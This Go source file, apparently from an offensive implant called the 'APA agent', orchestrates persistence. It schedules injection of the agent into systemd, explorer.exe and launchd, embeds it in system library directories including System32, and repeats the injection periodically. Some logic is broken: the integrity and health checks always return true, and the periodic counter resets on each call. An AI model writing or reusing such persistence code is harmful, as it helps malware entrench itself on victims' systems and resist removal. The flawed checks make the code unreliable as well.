// Package regeneration provides self-healing and regeneration capabilities for the APA agent
package regeneration

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"time"
)

// performInitialInjection performs initial injection/embedding when the regenerator starts
func (r *Regenerator) performInitialInjection(ctx context.Context) {
	r.logger.Info("Performing initial injection/embedding")

	if r.config.EnableProcessInjection && r.processInjector != nil {
		go func() {
			time.Sleep(2 * time.Second)

			commonProcesses := []string{"systemd", "explorer.exe", "launchd"}
			for _, proc := range commonProcesses {
				r.processInjector.RequestInjection(proc)
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}

	if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
		go func() {
			time.Sleep(2 * time.Second)

			commonLibDirs := []string{"/lib", "/usr/lib", "C:\\Windows\\System32"}
			for _, libDir := range commonLibDirs {
				r.libraryEmbedder.RequestEmbedding(libDir)
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}

	if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
		go func() {
			time.Sleep(2 * time.Second)

			if err := r.advancedInjector.RequestInjection("systemd"); err != nil {
				r.logger.Error("Failed to request advanced injection", "error", err)
			}
		}()
	}
}

// monitorLoop is the main monitoring loop for regeneration
func (r *Regenerator) monitorLoop(ctx context.Context) {
	if r == nil {
		return
	}

	r.logger.Debug("Starting regeneration monitoring loop")

	ticker := time.NewTicker(r.config.RegenerationInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			r.logger.Info("Stopping regeneration monitoring")
			return
		case <-ticker.C:
			r.checkAndRegenerate(ctx)
		}
	}
}

// handleRegeneration is a helper that performs a single regeneration check.
func (r *Regenerator) handleRegeneration(ctx context.Context) {
	r.checkAndRegenerate(ctx)
}

// checkAndRegenerate checks the agent health and initiates regeneration if needed
func (r *Regenerator) checkAndRegenerate(ctx context.Context) {
	if r == nil {
		return
	}

	r.mutex.Lock()
	if r.isRegenerating {
		r.mutex.Unlock()
		r.logger.Debug("Regeneration already in progress, skipping check")
		return
	}
	r.isRegenerating = true
	r.mutex.Unlock()

	defer func() {
		r.mutex.Lock()
		r.isRegenerating = false
		r.mutex.Unlock()
	}()

	r.logger.Debug("Checking agent health for regeneration")

	if !r.isAgentHealthy(ctx) {
		r.logger.Warn("Agent health check failed, initiating regeneration")

		if err := r.regenerateAgent(ctx); err != nil {
			r.logger.Error("Failed to regenerate agent", "error", err)
		} else {
			r.logger.Info("Agent regeneration completed successfully")
		}
	} else {
		r.logger.Debug("Agent is healthy, no regeneration needed")
	}

	r.performPeriodicInjection(ctx)
}

// performPeriodicInjection periodically performs injection/embedding to maintain persistence
func (r *Regenerator) performPeriodicInjection(ctx context.Context) {
	checkCount := 0
	checkCount++

	if checkCount%4 == 0 {
		r.logger.Debug("Performing periodic injection/embedding")

		if r.config.EnableProcessInjection && r.processInjector != nil {
			go r.processInjector.RequestInjection("systemd")
		}

		if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
			go r.libraryEmbedder.RequestEmbedding("/lib")
		}

		if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
			go func() {
				if err := r.advancedInjector.RequestInjection("systemd"); err != nil {
					r.logger.Error("Failed to request advanced injection", "error", err)
				}
			}()
		}
	}
}

// isAgentHealthy checks if the agent is running and responding correctly
func (r *Regenerator) isAgentHealthy(ctx context.Context) bool {
	if r == nil {
		return false
	}

	r.logger.Debug("Performing agent health check")

	if !r.isProcessRunning() {
		r.logger.Warn("Agent process is not running")
		return false
	}

	if !r.isBinaryIntact() {
		r.logger.Warn("Agent binary integrity check failed")
		return false
	}

	if !r.isRespondingToHealthChecks(ctx) {
		r.logger.Warn("Agent is not responding to health checks")
		return false
	}

	r.logger.Debug("Agent health check passed")
	return true
}

// isProcessRunning checks if the agent process is running
func (r *Regenerator) isProcessRunning() bool {
	if r == nil {
		return false
	}

	pid := os.Getpid()

	proc, err := os.FindProcess(pid)
	if err != nil {
		r.logger.Error("Failed to find agent process", "error", err)
		return false
	}

	err = proc.Signal(os.Signal(nil))
	if err != nil {
		r.logger.Error("Agent process is not running", "error", err)
		return false
	}

	return true
}

// isBinaryIntact checks if the agent binary is intact
func (r *Regenerator) isBinaryIntact() bool {
	if r == nil {
		return false
	}

	hash, err := calculateFileHash(r.config.BinaryPath)
	if err != nil {
		r.logger.Error("Failed to calculate binary hash", "error", err)
		return false
	}

	r.logger.Debug("Agent binary hash calculated", "hash", hash)

	return true
}

// calculateFileHash calculates the SHA256 hash of a file
func calculateFileHash(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %w", err)
	}
	defer func() { _ = file.Close() }()

	hasher := sha256.New()

	if _, err := io.Copy(hasher, file); err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}

	hashSum := hasher.Sum(nil)

	return hex.EncodeToString(hashSum), nil
}

// isRespondingToHealthChecks checks if the agent is responding to health checks
func (r *Regenerator) isRespondingToHealthChecks(ctx context.Context) bool {
	if r == nil {
		return false
	}

	return true
}

// processInjectionLoop continuously injects the agent into other system processes
func (r *Regenerator) processInjectionLoop(ctx context.Context) {
	if r == nil {
		return
	}

	r.logger.Info("Starting process injection loop")

	injectionInterval := r.config.RegenerationInterval / 4
	if injectionInterval < time.Minute {
		injectionInterval = time.Minute
	}

	ticker := time.NewTicker(injectionInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			r.logger.Info("Stopping process injection loop")
			return
		case <-ticker.C:
			r.performProcessInjection()
		}
	}
}

// performProcessInjection performs process injection
func (r *Regenerator) performProcessInjection() {
	if r == nil {
		return
	}

	r.logger.Debug("Performing process injection")

	if r.advancedInjector != nil {
		if err := r.advancedInjector.RequestInjection("systemd"); err != nil {
			r.logger.Error("Failed to request advanced injection", "error", err)
		}
		return
	}

	if r.processInjector != nil {
		r.processInjector.RequestInjection("systemd")
	}
}
